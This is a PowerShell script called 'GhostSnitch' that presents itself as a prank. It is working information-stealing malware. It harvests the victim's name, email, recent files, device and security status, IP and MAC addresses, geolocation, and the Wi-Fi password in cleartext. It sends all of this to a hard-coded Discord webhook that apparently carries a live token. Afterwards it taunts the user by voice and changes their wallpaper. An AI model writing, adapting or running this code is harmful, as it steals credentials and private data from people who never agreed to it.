####################################################################################################
# Title       : GhostSnitch
# Version     : 1.2
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame.
####################################################################################################

# --- Configuration -----------------------------------------------------------
$webhookUrl  = 'https://discord.com/api/webhooks/1504979465015394407/vfGz6lp8QwdKt_6z_4AIcKefhRoCueEUh8gb3IioAwIzCJ9LB9WP2aC-HLKJ3c_2vabw'   # Discord webhook (#ghostsnitch-reports) — from DISCORD_WEBHOOK_GHOSTSNITCH in .env
$prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
$targetAlias = $env:COMPUTERNAME
# -----------------------------------------------------------------------------

# Set up SAPI for text-to-speech
$s = New-Object -ComObject SAPI.SpVoice
$s.Rate = -1

function Get-FullName {
    try {
        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
        if ([string]::IsNullOrWhiteSpace($fullName)) { $fullName = $env:username }
    } catch {
        $fullName = $env:username
    }
    return $fullName
}

function Get-UserInfo {
    return "User: $env:USERNAME on $env:COMPUTERNAME"
}

function Get-Email {
    try {
        $email = (gpresult /z 2>$null | Select-String -Pattern "\b\S+@\S+\.\S+\b").Matches.Value | Select-Object -First 1
        if (-not $email) { return "No email found. A mystery wrapped in encryption." }
        if ($email -like "*gmail*")   { return "Gmail user? Stylish. But your inbox is probably chaos." }
        if ($email -like "*yahoo*")   { return "Yahoo... in 2025? A digital fossil." }
        if ($email -like "*hotmail*") { return "Hotmail? Do you also use Netscape?" }
        return "$email is your email? Obscure. I like it."
    } catch {
        return "No email found. A mystery wrapped in encryption."
    }
}

function Get-OS {
    return (Get-CimInstance Win32_OperatingSystem).Caption
}

function Get-Uptime {
    $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $ts = New-TimeSpan -Start $uptime -End (Get-Date)
    return "Uptime: $($ts.Days) days, $($ts.Hours) hours"
}

function Get-DriveStats {
    $drives = Get-PSDrive -PSProvider FileSystem
    return ($drives | ForEach-Object {
        "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
    }) -join "`n"
}

function Get-RecentFiles {
    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 5
    return "Recent Files: " + (($recent | ForEach-Object { $_.Name }) -join ", ")
}

function Get-USB {
    try { return (Get-PnpDevice -Class 'USB' -ErrorAction Stop).FriendlyName -join ", " }
    catch { return "No USB info found" }
}

function Get-BitLocker {
    try {
        $status = Get-BitLockerVolume -ErrorAction Stop | Select-Object MountPoint, ProtectionStatus
        return ($status | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join ", "
    } catch { return "BitLocker status unknown" }
}

function Get-VPNStatus {
    try {
        $vpnPattern = 'VPN|TAP-Win|WireGuard|OpenVPN|Cisco AnyConnect|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier'
        $vpnAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -match $vpnPattern }
        $builtIn = Get-VpnConnection -ErrorAction SilentlyContinue | Where-Object { $_.ConnectionStatus -eq 'Connected' }
        $found = @()
        if ($vpnAdapters) { $found += $vpnAdapters | ForEach-Object { $_.InterfaceDescription } }
        if ($builtIn)     { $found += $builtIn     | ForEach-Object { $_.Name } }
        if ($found) { return "Active: " + ($found -join ", ") }
        return "No VPN detected"
    } catch { return "Unknown" }
}

function Get-NetworkInfo {
    try {
        $excludePattern = 'VPN|TAP|TUN|WireGuard|OpenVPN|Cisco|GlobalProtect|NordVPN|ExpressVPN|Mullvad|ProtonVPN|Tailscale|ZeroTier|Hyper-V|Virtual|vEthernet|Loopback|Bluetooth|6to4|ISATAP|Teredo'
        $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch $excludePattern } |
                   Select-Object -First 1
        if (-not $adapter) { $adapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1 }
        $ip = (Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
               Select-Object -First 1).IPAddress
        return "Local IP: $ip, MAC: $($adapter.MacAddress)"
    } catch {
        $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
                Select-Object -First 1).IPAddress
        $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
        return "Local IP: $ip, MAC: $mac"
    }
}

function Get-Antivirus {
    try {
        $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct -ErrorAction Stop
        return ($av.displayName) -join ", "
    } catch { return "No antivirus info found" }
}

function Get-TopProcesses {
    $procs = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5
    return ($procs | ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
}

function Get-RAM {
    try {
        $RAM = [int]((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
        if ($RAM -lt 4)  { return "$RAM GB of RAM? This machine is powered by hopes and prayers." }
        if ($RAM -lt 8)  { return "$RAM GB of RAM? Just enough to load your regrets." }
        if ($RAM -lt 16) { return "$RAM GB? Gamer vibes... if lag was a feature." }
        return "$RAM GB? Respect. But all muscle and no firewall? Hilarious."
    } catch { return "Unable to detect RAM. Maybe the hamster escaped the wheel?" }
}

function Get-PubIP {
    foreach ($url in @('https://ipinfo.io/ip', 'https://api.ipify.org', 'https://icanhazip.com')) {
        try {
            $IP = (Invoke-WebRequest $url -UseBasicParsing -TimeoutSec 5).Content.Trim()
            if ($IP -match '^\d+\.\d+\.\d+\.\d+$') { return "Your public IP is $IP. Say hi to the world for me." }
        } catch {}
    }
    return "Couldn't fetch your public IP. You're a ghost already."
}

function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface 2>$null | Select-String '^\s+SSID\s+:').ToString().Split(":")[1].Trim()
        if ([string]::IsNullOrEmpty($ssid)) { return "Not connected to WiFi. Cable gang?" }

        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
        if (-not $isAdmin) {
            return "Connected to $ssid. Password redacted — you're not admin, and neither am I."
        }

        $pass   = (netsh wlan show profile name="$ssid" key=clear 2>$null | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        $length = $pass.Length
        if ($length -lt 8)  { return "$ssid password: '$pass' — it's crying for help." }
        if ($length -lt 12) { return "$ssid password: '$pass' — trying, but still weak." }
        return "$ssid password: '$pass'. Secure? Maybe. Still roasted? Definitely."
    } catch { return "No WiFi found. Freeloading on ethernet?" }
}

function Get-PasswordAge {
    try {
        $line    = (net user $env:UserName 2>$null | Select-String "Password last set").ToString()
        $dateStr = $line.Substring($line.IndexOf(":") + 1).Trim()
        $days    = (New-TimeSpan -Start ([datetime]$dateStr) -End (Get-Date)).Days
        if ($days -lt 30)  { return "Changed $days days ago. Fresh... but not fresh enough." }
        if ($days -lt 180) { return "$days days since last change. Cruising for a bruising." }
        return "$days days? That password's got mold on it."
    } catch { return "Password age unknown. Are you even human?" }
}

function Get-GeoInfo {
    $endpoints = @(
        @{ url = 'https://ipwho.is/';         city = 'city'; region = 'region';     country = 'country';      isp = { $r.connection.isp } },
        @{ url = 'https://ipapi.co/json/';    city = 'city'; region = 'region';     country = 'country_name'; isp = { $r.org } },
        @{ url = 'https://ip-api.com/json/';  city = 'city'; region = 'regionName'; country = 'country';      isp = { $r.isp } }
    )
    foreach ($ep in $endpoints) {
        try {
            $r    = (Invoke-WebRequest $ep.url -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
            $city = $r.($ep.city); $region = $r.($ep.region); $country = $r.($ep.country); $isp = & $ep.isp
            if ($city) { return "$city, $region, $country  |  ISP: $isp" }
        } catch {}
    }
    return "Geolocation unavailable"
}

function Get-WallpaperPath {
    try { return (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallPaper).WallPaper }
    catch { return "Could not retrieve current wallpaper." }
}

function Make-Wallpaper {
    Add-Type -AssemblyName System.Drawing
    $screen = Add-Type -MemberDefinition @"
        [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
        [System.Runtime.InteropServices.DllImport("gdi32.dll")]  public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
"@ -Name "Win32GS" -Namespace "Screen" -PassThru
    $hdc    = [Screen.Win32GS]::GetDC([IntPtr]::Zero)
    $width  = [Screen.Win32GS]::GetDeviceCaps($hdc, 118)
    $height = [Screen.Win32GS]::GetDeviceCaps($hdc, 117)
    $bitmap   = New-Object System.Drawing.Bitmap $width, $height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.Clear([System.Drawing.Color]::Black)
    $font  = New-Object System.Drawing.Font "Consolas", 24
    $brush = [System.Drawing.Brushes]::Lime
    $msg   = "Your system was evaluated.`nYou're not ready for the future.`n- GhostSnitch"
    $graphics.DrawString($msg, $font, $brush, 100, 100)
    $path = "$env:USERPROFILE\Desktop\roasted.jpg"
    $bitmap.Save($path)
    $graphics.Dispose()
    Add-Type -TypeDefinition @"
        using System.Runtime.InteropServices;
        public class WallpaperGS {
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
    [WallpaperGS]::SystemParametersInfo(20, 0, $path, 3) | Out-Null
    return $path
}

# ---- Collect all data once so we call each function exactly one time --------
$fullName   = Get-FullName
$ramRoast   = Get-RAM
$pubIP      = Get-PubIP
$wifiRoast  = Get-WifiPass
$passAge    = Get-PasswordAge
$emailRoast = Get-Email
$userInfo   = Get-UserInfo
$osInfo     = Get-OS
$uptime     = Get-Uptime
$drives     = Get-DriveStats
$recent     = Get-RecentFiles
$usb        = Get-USB
$bitlocker  = Get-BitLocker
$network    = Get-NetworkInfo
$vpnStatus  = Get-VPNStatus
$av         = Get-Antivirus
$procs      = Get-TopProcesses
$geo        = Get-GeoInfo

# ---- Send report to Discord -------------------------------------------------
if ($webhookUrl -ne 'REPLACE_ME') {
    $discordPayload = @{
        username = "GhostSnitch Bot"
        content  = "**Roast Session Logged!** | ID: ``$prankId``"
        embeds   = @(@{
            title  = "Roast Report for $fullName"
            color  = 16711680
            fields = @(
                @{ name = "Prank ID";       value = $prankId;    inline = $true  },
                @{ name = "Target";         value = $targetAlias; inline = $true  },
                @{ name = "Location";       value = $geo;        inline = $false },
                @{ name = "User Info";      value = $userInfo;   inline = $true  },
                @{ name = "Email Roast";    value = $emailRoast; inline = $false },
                @{ name = "OS";             value = $osInfo;     inline = $true  },
                @{ name = "Uptime";         value = $uptime;     inline = $true  },
                @{ name = "Drives";         value = $drives;     inline = $false },
                @{ name = "Recent Files";   value = $recent;     inline = $false },
                @{ name = "USB Devices";    value = $usb;        inline = $false },
                @{ name = "BitLocker";      value = $bitlocker;  inline = $true  },
                @{ name = "Network";        value = $network;    inline = $true  },
                @{ name = "VPN";            value = $vpnStatus;  inline = $true  },
                @{ name = "Antivirus";      value = $av;         inline = $false },
                @{ name = "Top Processes";  value = $procs;      inline = $false },
                @{ name = "RAM Roast";      value = $ramRoast;   inline = $true  },
                @{ name = "Public IP";      value = $pubIP;      inline = $true  },
                @{ name = "WiFi Password";  value = $wifiRoast;  inline = $false },
                @{ name = "Password Age";   value = $passAge;    inline = $false }
            )
            footer    = @{ text = "GhostSnitch v1.2 by TBJr" }
            timestamp = (Get-Date).ToString("o")
        })
    }
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post `
                -Body (ConvertTo-Json $discordPayload -Depth 10) `
                -ContentType 'application/json' -ErrorAction Stop
            break
        } catch {
            if ($attempt -lt 3) { Start-Sleep -Seconds 3 }
        }
    }
}

# ---- Wait for mouse movement before playing the audio roast -----------------
Add-Type -AssemblyName System.Windows.Forms
$startPos = [System.Windows.Forms.Cursor]::Position
while ($true) {
    Start-Sleep -Seconds 2
    $cur = [System.Windows.Forms.Cursor]::Position
    if ($cur.X -ne $startPos.X -or $cur.Y -ne $startPos.Y) { break }
}

# ---- Deliver the roast ------------------------------------------------------
$s.Speak("Hello, $fullName. Let's review your setup.")
$s.Speak($ramRoast)
$s.Speak($pubIP)
$s.Speak($wifiRoast)
$s.Speak($passAge)
$s.Speak($emailRoast)
$s.Speak("Check your wallpaper. And don't act surprised.")
Make-Wallpaper | Out-Null
$s.Speak("That concludes your roast. GhostSnitch out.")
